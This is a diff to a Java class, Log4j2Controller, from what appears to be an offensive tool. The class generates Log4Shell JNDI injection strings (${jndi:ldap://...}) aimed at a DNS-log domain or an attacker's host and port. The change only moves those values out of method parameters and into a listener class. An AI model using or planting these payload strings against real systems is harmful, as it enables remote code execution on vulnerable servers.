@@ -1,17 +1,19 @@
 package com.swordHostDemo.controller;
 
+import com.swordHostDemo.pojo.menuBeanListener;
+
 /**
  * @date: 2022/12/28 20:19
  * @description:
  */
 public class Log4j2Controller {
-    public static String LoDnslog4j2(String Dnslog4j2){
-        String str = "${jndi:ldap://"+Dnslog4j2+"/}";
+    public static String LoDnslog4j2(){
+        String str = "${jndi:ldap://"+menuBeanListener.getDnsLog()+"/}";
         return str;
     }
 
-    public static String LoIPlog4j2(String Lhost,String lport){
-        String str = "${jndi:ldap://"+Lhost+":"+lport+"/}";
+    public static String LoIPlog4j2(){
+        String str = "${jndi:ldap://"+ menuBeanListener.getLhost()+":"+menuBeanListener.getLport()+"/}";
         return str;
     }
 
